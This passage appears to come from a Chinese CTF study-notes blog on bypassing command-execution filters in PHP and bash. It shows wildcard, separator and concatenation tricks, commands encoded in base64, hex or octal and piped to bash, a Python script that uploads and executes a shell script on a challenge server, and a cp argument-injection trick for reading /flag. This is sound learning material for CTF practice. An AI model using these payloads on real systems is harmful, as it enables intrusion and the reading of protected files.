+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; system(<span class="string">&#x27;tac&lt;fl?g.php&#x27;</span>);</span><br><span class="line">sh: line 1: fl?g.php: No such file or directory</span><br><span class="line">php &gt; system(<span class="string">&#x27;tac&lt;fla*&#x27;</span>);</span><br><span class="line">sh: line 1: fla*: No such file or directory</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong><code>system()</code> 并不是直接调用 Bash，而是通过 <code>/bin/sh -c &quot;命令&quot;</code> 执行</strong></p>
+</blockquote>
+<p>而某些系统（尤其是 Alpine Linux、Docker 容器、或精简环境）的 <code>/bin/sh</code> 是 <strong><code>dash</code></strong> 而不是 <code>bash</code>。</p>
+<p> ⚠️ <code>dash</code> 对重定向中的通配符处理更严格！</p>
+</blockquote>
+<h4 id="其他间隔符"><a href="#其他间隔符" class="headerlink" title="其他间隔符"></a>其他间隔符</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空格 &#x27; &#x27;    %20</span><br><span class="line">制表符 &#x27;\t&#x27; %09</span><br></pre></td></tr></table></figure>
+
+<h3 id="命令名-文件名过滤"><a href="#命令名-文件名过滤" class="headerlink" title="命令名&amp;文件名过滤"></a>命令名&amp;文件名过滤</h3><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><blockquote>
+<p>通配符又叫做 globbing patterns。因为 Unix 早期有一个<code>/etc/glob</code>文件保存通配符模板，后来 Bash 内置了这个功能，但是这个名字被保留了下来。</p>
+<p><a target="_blank" rel="noopener" href="https://ruanyifeng.com/blog/2018/09/bash-wildcards.html">https://ruanyifeng.com/blog/2018/09/bash-wildcards.html</a></p>
+</blockquote>
+<h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote>
+<p><strong>（1）通配符是先解释，再执行。</strong></p>
+<p><strong>（2）通配符不匹配，会原样输出。</strong></p>
+<p><strong>（3）<code>?</code>或<code>*</code>这样的通配符，不能匹配路径分隔符（<code>/</code>）。</strong></p>
+</blockquote>
+<ul>
+<li><code>?</code>匹配单个字符</li>
+<li><code>*</code>代表任意数量的字符。匹配当前目录下<strong>所有非隐藏文件和目录</strong>（不包括以 <code>.</code> 开头的文件）,<strong>Shell 先展开，再交给命令跑。</strong></li>
+<li><code>[...]</code>匹配方括号之中的任意一个字符</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> [a-l][a-l][a-l][a-l].txt</span><br></pre></td></tr></table></figure>
+
+<p>ascii码中可视字符顺序</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~</span><br><span class="line">!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>{...} 表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</code></li>
+<li><code>[^...]</code>和<code>[!...]</code>表示匹配不在方括号里面的字符（不包括空字符）。这两种写法是等价的。</li>
+<li><code>{start..end}</code>会匹配连续范围的字符。</li>
+</ul>
+<h4 id="特殊变量"><a href="#特殊变量" class="headerlink" title="特殊变量"></a>特殊变量</h4><ol>
+<li><strong>“<code>$0</code>”</strong>– 正在执行的脚本的名称。</li>
+<li><strong>”$<code>1-$9</code>”</strong> – 前九个命令行参数。</li>
+<li><strong>“ <code>$#</code>”</strong>– 命令行参数的数量。</li>
+<li><strong>”<code>$\*</code>“</strong> – 所有命令行参数作为单个字符串。</li>
+<li><strong>”<code>$@</code>”</strong> – 所有命令行参数作为一个数组。</li>
+<li><strong>“ <code>$？</code>”</strong> – 上次执行的命令的退出状态。</li>
+<li><strong>”<code>$$</code>“</strong>  – 当前shell的进程ID。</li>
+<li><strong>”<code>$！</code>“</strong> – 最后一个后台命令的进程 ID。</li>
+</ol>
+<h4 id="单引号-双引号-反引号"><a href="#单引号-双引号-反引号" class="headerlink" title="单引号 双引号 反引号"></a>单引号 双引号 反引号</h4><h4 id="反斜线"><a href="#反斜线" class="headerlink" title="反斜线\"></a>反斜线\</h4><blockquote>
+<p>\特殊字符去掉功能性，单纯表示为字符串，而linux看到反斜线\会自动帮你去掉,正常执行命令</p>
+</blockquote>
+<h4 id="拼接"><a href="#拼接" class="headerlink" title="拼接"></a>拼接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=c;<span class="variable">$&#123;a&#125;</span>at f*</span><br><span class="line">t=t;ca<span class="variable">$t</span> f*</span><br></pre></td></tr></table></figure>
+
+<h4 id="利用linux中的环境变量"><a href="#利用linux中的环境变量" class="headerlink" title="利用linux中的环境变量"></a>利用linux中的环境变量</h4><blockquote>
+<p>也可以获取被ban的字符如<code>/</code></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123183254990.png" alt="image-20260123183254902"></p>
+<blockquote>
+<p>env 环境变量均可用</p>
+</blockquote>
+<h4 id="管道符-linux命令替换"><a href="#管道符-linux命令替换" class="headerlink" title="管道符&amp;linux命令替换"></a>管道符&amp;linux命令替换</h4><blockquote>
+<p>搭配编码使用</p>
+</blockquote>
+<h5 id="printf"><a href="#printf" class="headerlink" title="printf"></a>printf</h5><blockquote>
+<p>格式化并输出结果。</p>
+<p><a target="_blank" rel="noopener" href="https://www.linux-man.cn/command/printf/">printf命令手册，printf命令详解 - Linux命令手册</a></p>
+<p><code>printf</code> 会<strong>主动解析这些转义序列</strong>，将其转换为对应的字符。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">\NNN        八进制数 (1到3位数字)</span><br><span class="line">\xHH        十六进制数 (1到2位数字)</span><br><span class="line">\uHHHH      Unicode字符附加4位十六进制数字</span><br><span class="line">\UHHHHHHHH  Unicode字符附加8位十六进制数字</span><br><span class="line">%%          百分号</span><br></pre></td></tr></table></figure></blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> <span class="string">&quot;<span class="subst">$(echo &#x27;L2ZsYWc=&#x27; | base64 -d)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> Y2F0IGZsYWcq | <span class="built_in">base64</span> -d | bash <span class="comment">#base32同理</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 63617420666c61672a | xxd -r -p | bash <span class="comment">#16进制</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\143\141\164\040\146\154\141\147\052&quot;</span> | bash <span class="comment">#8进制</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\x63\x61\x74\x20\x66\x6c\x61\x67\x2a&quot;</span> | bash <span class="comment">#16进制</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;\u0063\u0061\u0074\u0020\u0066\u006c\u0061\u0067\u002a&quot;</span> | bash <span class="comment">#Unicode字符附加4位十六进制数字</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>oct编码脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_octal</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    将字符串 s 转换为八进制转义序列（\nnn 格式）</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;\\<span class="subst">&#123;<span class="built_in">ord</span>(c):03o&#125;</span>&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 从命令行参数读取输入</span></span><br><span class="line">        input_str = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 从标准输入读取一行</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请输入要编码的字符串:&quot;</span>)</span><br><span class="line">        input_str = <span class="built_in">input</span>().rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    encoded = string_to_octal(input_str)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;八进制编码结果:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(encoded)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h4 id="绝对命令搭配通配符RCE"><a href="#绝对命令搭配通配符RCE" class="headerlink" title="绝对命令搭配通配符RCE"></a>绝对命令搭配通配符RCE</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/bin/ca?<span class="variable">$&#123;IFS&#125;</span>????.??? </span><br><span class="line"></span><br><span class="line">/???/????64 ????.???</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看目录的命令"><a href="#查看目录的命令" class="headerlink" title="查看目录的命令"></a>查看目录的命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="built_in">echo</span> *</span><br><span class="line">find .</span><br><span class="line">tree</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux各种读取文件的方法"><a href="#Linux各种读取文件的方法" class="headerlink" title="Linux各种读取文件的方法"></a>Linux各种读取文件的方法</h3><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/Linux%E5%90%84%E7%A7%8D%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%91%BD%E4%BB%A4/">Linux各种读取文件的命令</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> <span class="built_in">tac</span></span><br><span class="line"><span class="built_in">nl</span></span><br><span class="line">more less</span><br><span class="line">bzmore bzless</span><br><span class="line"><span class="built_in">head</span> <span class="built_in">tail</span></span><br><span class="line">vi vim nano </span><br><span class="line">strings </span><br><span class="line"><span class="built_in">od</span> hexdump xxd <span class="built_in">base64</span></span><br><span class="line"><span class="built_in">tee</span> sed <span class="built_in">cut</span> grep awk</span><br><span class="line"><span class="built_in">sort</span>  <span class="built_in">uniq</span> rev  <span class="built_in">paste</span></span><br><span class="line"><span class="built_in">source</span> sh bash .</span><br><span class="line">curl</span><br><span class="line"><span class="built_in">date</span></span><br><span class="line">file</span><br><span class="line"><span class="built_in">dd</span></span><br><span class="line">diff</span><br><span class="line"></span><br><span class="line"><span class="comment">#php cli参数</span></span><br><span class="line">-s  输出突出显示的HTML语法源</span><br><span class="line">-r  在不使用脚本标签的情况下运行PHP代码”&lt;?..?&gt; <span class="string">&#x27;</span></span><br><span class="line"><span class="string">man </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h3><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/%E6%97%A0%E5%9B%9E%E6%98%BErce/">无回显rce</a></p>
+<h3 id="bash无字母数字rce"><a href="#bash无字母数字rce" class="headerlink" title="bash无字母数字rce"></a>bash无字母数字rce</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Lxw2004/article/details/157477083">https://blog.csdn.net/Lxw2004/article/details/157477083</a></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.gnu.org/software/bash/manual/html_node/ANSI_002dC-Quoting.html">ANSI-C 引用（Bash 参考手册）</a></p>
+<p>该形式的字符序列被视为一种特殊的单引号。该序列扩展到，并按照ASIC标准的指定替换反斜线标点符号。反斜线换码序列（如果存在）被解码如下：$’字符串’ string字符串</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260123195241870.png" alt="image-20260123195241734"></p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260128152930807.png" alt="image-20260128152930720"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$<span class="string">&#x27;\154\163&#x27;</span> <span class="comment">#ls</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span> $<span class="string">&#x27;\057\146\154\141\147&#x27;</span> <span class="comment">#cat /flag</span></span><br><span class="line">&#123;$<span class="string">&#x27;\143\141\164&#x27;</span>,$<span class="string">&#x27;\057\146\154\141\147&#x27;</span>&#125;</span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span>$IFS$<span class="string">&#x27;\057\146\154\141\147&#x27;</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span>&lt;$<span class="string">&#x27;\057\146\154\141\147&#x27;</span></span><br><span class="line">$<span class="string">&#x27;\143\141\164&#x27;</span>&lt;&gt;$<span class="string">&#x27;\057\146\154\141\147&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260128153551023.png" alt="image-20260128153550926"></p>
+<h3 id="bash长度限制rce"><a href="#bash长度限制rce" class="headerlink" title="bash长度限制rce"></a>bash长度限制rce</h3><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/bash%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6rce/">bash长度限制rce</a></p>
+<h2 id="php-bypass空格"><a href="#php-bypass空格" class="headerlink" title="php-bypass空格"></a>php-bypass空格</h2><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.types.string.php">PHP: String 字符串 - Manual</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260108174357897.png" alt="image-20260108174357736"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%0a-%f</span><br><span class="line">%1b</span><br><span class="line">%09</span><br><span class="line">%00</span><br></pre></td></tr></table></figure>
+
+<h2 id="php不需要括号的敏感函数"><a href="#php不需要括号的敏感函数" class="headerlink" title="php不需要括号的敏感函数"></a><code>php</code>不需要括号的敏感函数</h2><table>
+<thead>
+<tr>
+<th>语言结构</th>
+<th>说明</th>
+<th>推荐写法</th>
+<th>错误&#x2F;不推荐写法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>echo</code></td>
+<td>输出一个或多个字符串</td>
+<td><code>echo &quot;hello&quot;;</code> <code>echo &quot;a&quot;, &quot;b&quot;;</code></td>
+<td><code>echo(&quot;hello&quot;);</code>（虽合法但冗余）</td>
+</tr>
+<tr>
+<td><code>print</code></td>
+<td>输出一个字符串（有返回值）</td>
+<td><code>print &quot;hello&quot;;</code></td>
+<td><code>print(&quot;hello&quot;);</code></td>
+</tr>
+<tr>
+<td><code>include</code> &#x2F; <code>require</code></td>
+<td>包含文件</td>
+<td><code>include &#39;a.php&#39;;</code></td>
+<td><code>include(&#39;a&#39;);</code></td>
+</tr>
+<tr>
+<td><code>include_once</code> &#x2F; <code>require_once</code></td>
+<td>一次性包含</td>
+<td><code>require_once &#39;lib.php&#39;;</code></td>
+<td><code>require_once(&#39;lib.php&#39;);</code></td>
+</tr>
+<tr>
+<td><code>exit</code> &#x2F; <code>die</code></td>
+<td>终止脚本</td>
+<td><code>exit;</code> 或 <code>exit(&quot;msg&quot;);</code></td>
+<td><code>exit(&quot;msg&quot;);</code>（带参数时括号合法但非必须）</td>
+</tr>
+<tr>
+<td><code>return</code></td>
+<td>返回值</td>
+<td><code>return $x;</code></td>
+<td><code>return($x);</code>（合法但冗余）</td>
+</tr>
+</tbody></table>
+<h2 id="php函数"><a href="#php函数" class="headerlink" title="php函数"></a>php函数</h2><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/RCE-PHP%E5%87%BD%E6%95%B0/">RCE-PHP函数</a></p>
+<blockquote>
+<ul>
+<li>命令执行函数</li>
+<li>代码执行函数</li>
+<li>输出函数</li>
+<li>文件读取函数</li>
+<li>文件包含函数</li>
+<li>其他危险函数-无参数RCE细说</li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.exec.php">PHP: 程序执行函数 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.execution.php">PHP: 执行 - Manual</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20260107171048892.png" alt="image-20260107171048819"></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.funchand.php">PHP: 函数处理 函数 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.filesystem.php">PHP: 文件系统函数 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.misc.php">PHP: 杂项 函数 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readgzfile.php">PHP: readgzfile - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.popen.php">PHP: popen - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ref.info.php">PHP: PHP 选项&#x2F;信息 函数 - Manual</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.url.php">https://www.php.net/manual/zh/book.url.php</a></p>
+<p>补充</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>();</span><br><span class="line"><span class="title function_ invoke__">getcwd</span>() <span class="comment">//相当与pwd</span></span><br><span class="line"><span class="title function_ invoke__">getenv</span>() <span class="comment">//相当与env</span></span><br><span class="line">$&#123;&#125;; <span class="comment">//可变变量</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="php无参数RCE"><a href="#php无参数RCE" class="headerlink" title="php无参数RCE"></a>php无参数RCE</h2><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/%E6%97%A0%E5%8F%82%E6%95%B0rce/">无参数rce</a></p>
+<h2 id="php无字母数字RCE"><a href="#php无字母数字RCE" class="headerlink" title="php无字母数字RCE"></a>php无字母数字RCE</h2><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/">无字母数字rce</a></p>
+<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#php5shell">无字母数字webshell之提高篇 | 离别歌</a></p>
+<blockquote>
+<p>补充</p>
+<p>通配符又叫做 globbing patterns。因为 Unix 早期有一个<code>/etc/glob</code>文件保存通配符模板，后来 Bash 内置了这个功能，但是这个名字被保留了下来。</p>
+<p>通配符早于正则表达式出现，可以看作是原始的正则表达式。它的功能没有正则那么强大灵活，但是胜在简单和方便。</p>
+<p><a target="_blank" rel="noopener" href="https://ruanyifeng.com/blog/2018/09/bash-wildcards.html">命令行通配符教程 - 阮一峰的网络日志</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d9633bb74e9a">glob风格通配符 - 简书</a></p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="comment">#author yu22x</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://20f89f0a-f73c-426d-8770-7bb2c0ae943a.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;#!/bin/bash\ncat flag.php&#x27;</span>&#125;</span><br><span class="line">response=requests.post(url,files=files,proxies=proxies)</span><br><span class="line">html = response.text</span><br><span class="line"><span class="built_in">print</span>(html)</span><br><span class="line"><span class="comment">#code为?&gt;&lt;?=`. /???/????????[@-[]`;?&gt; 根据实际情况调整</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="php数学函数RCE"><a href="#php数学函数RCE" class="headerlink" title="php数学函数RCE"></a>php数学函数RCE</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/220813">php利用math函数rce总结-安全KER - 安全资讯平台</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12664136.html">(<em>´∇｀</em>) 欢迎回来！</a></p>
+<p><a target="_blank" rel="noopener" href="https://xzlang.github.io/2020/04/22/%E5%90%84%E7%A7%8D%E5%A7%BF%E5%8A%BF%E7%9A%84RCE/">PHP各种姿势的RCE | XZLang</a></p>
+<h2 id="环境变量RCE"><a href="#环境变量RCE" class="headerlink" title="环境变量RCE"></a>环境变量RCE</h2><p><a target="_blank" rel="noopener" href="https://lierbushiwo.github.io/2026/01/28/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Frce/">环境变量rce</a></p>
+<h2 id="通配符在野注入"><a href="#通配符在野注入" class="headerlink" title="通配符在野注入"></a>通配符在野注入</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fly233/articles/19082344">2025 “湾区杯”网络安全大赛 WEB方向WP 全 - fly233 - 博客园</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line"><span class="built_in">cp</span> -P * /var/www/html/backup/</span><br><span class="line"><span class="built_in">chmod</span> 755 -R /var/www/html/backup/</span><br><span class="line"><span class="built_in">sleep</span> 10</span><br></pre></td></tr></table></figure>
+
+<h4 id="cp指令参数"><a href="#cp指令参数" class="headerlink" title="cp指令参数"></a>cp指令参数</h4><table>
+<thead>
+<tr>
+<th align="left">选项</th>
+<th align="left">名称&#x2F;含义</th>
+<th align="left">对命令行参数中的符号链接</th>
+<th align="left">对目录内部的符号链接</th>
+<th align="left">备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-P</code></td>
+<td align="left"><strong>不跟随</strong> (Preserve link)</td>
+<td align="left"><strong>复制链接本身</strong></td>
+<td align="left"><strong>复制链接本身</strong></td>
+<td align="left"><strong>通常是默认行为</strong></td>
+</tr>
+<tr>
+<td align="left"><code>-H</code></td>
+<td align="left"><strong>仅命令行跟随</strong></td>
+<td align="left"><strong>复制链接指向的目标</strong></td>
+<td align="left"><strong>复制链接本身</strong></td>
+<td align="left">只对直接列出的源起作用</td>
+</tr>
+<tr>
+<td align="left"><code>-L</code></td>
+<td align="left"><strong>总是跟随</strong> (Follow link)</td>
+<td align="left"><strong>复制链接指向的目标</strong></td>
+<td align="left"><strong>复制链接指向的目标</strong></td>
+<td align="left">与 <code>-P</code> 行为完全相反</td>
+</tr>
+</tbody></table>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -P * /var/www/html/backup/</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h4 id="的解析规则（Shell-Globbing）"><a href="#的解析规则（Shell-Globbing）" class="headerlink" title="* 的解析规则（Shell Globbing）"></a><code>*</code> 的解析规则（Shell Globbing）</h4><ul>
+<li>Shell 会列出<strong>当前目录下所有非隐藏文件和目录</strong>（即不以 <code>.</code> 开头的）。</li>
+<li>然后<strong>按字母顺序排序</strong>，生成一个文件名列表。</li>
+<li>最后，把 <code>*</code> 替换成这个列表，再执行 <code>cp</code> 命令。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果当前目录有：</span><br><span class="line">a.txt</span><br><span class="line">b.txt</span><br><span class="line">file.txt</span><br><span class="line"></span><br><span class="line">就会解析成 </span><br><span class="line">cp -P a.txt b.txt file.txt /var/www/html/backup/</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果文件名是 <code>-</code> 开头会发生什么？</strong></p>
+<p>➤ <strong>灾难性后果：文件名被当作命令行选项解析！</strong></p>
+</blockquote>
+<p>根据linux系统命令参数的后来者胜出原则,我们在 -P 后边添加 -H 就会实现跟随链接复制了.<br>所以,我们可以创建一个名字为 <code>-H</code>或者 <code>-L</code>的文件,然后再创建 &#x2F;flag的链接,就可以复制flag的内容了.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"><span class="built_in">touch</span> -- -H</span><br><span class="line"><span class="built_in">ln</span> -s /flag flag</span><br><span class="line"><span class="built_in">cat</span> backup/flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="LD-PRELOAD劫持"><a href="#LD-PRELOAD劫持" class="headerlink" title="LD_PRELOAD劫持"></a>LD_PRELOAD劫持</h2><p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/">https://fushuling.com/index.php/2025/07/30/%e5%bd%93include%e9%82%82%e9%80%85phar-deadsecctf2025-baby-web/</a></p>
+<p>在<em>控制环境变量</em>的基础上通过更改依赖库劫持，达到rce的目的</p>
+<blockquote>
+<p>今年强网拟态考到了这个点</p>
